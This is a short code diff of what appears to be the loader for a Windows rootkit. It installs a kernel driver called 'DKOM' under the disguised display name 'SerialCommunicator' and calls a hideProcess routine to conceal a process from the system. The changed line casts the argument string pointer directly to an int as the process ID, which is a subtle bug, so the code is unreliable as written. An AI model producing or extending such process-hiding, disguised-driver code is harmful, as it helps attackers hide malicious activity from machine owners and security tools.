@@ -38,11 +38,11 @@ int main(int argc, char *argv[])
 	printf("lasterr: %d\n", GetLastError());
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
-	//if (argc < 2)
-	//{
-	//	printf("Not enougth arguments");
-	//	return 0;
-	//}
+	if (argc < 2)
+	{
+		printf("Not enougth arguments");
+		return 0;
+	}
 	char* driverName = "DKOM";
 	char* displayName = "SerialCommunicator"; // friendly name
 #ifdef DEBUG
@@ -52,7 +52,7 @@ int main(int argc, char *argv[])
 	sprintf(buff, "sc delete %s", driverName);
 	system(buff);
 #endif
-	if (loadSysFile(driverName, displayName) && hideProcess(displayName/*driverName*/, 4/*(int)argv[1]*/)) //(int)argv[1]);)//"friendly driver"))//argv[1]);
+	if (loadSysFile(driverName, displayName) && hideProcess(displayName, (int)argv[1])) //(int)argv[1]);)//"friendly driver"))//argv[1]);
 		printf("success\n");
 	else
 		printf("failure\n");
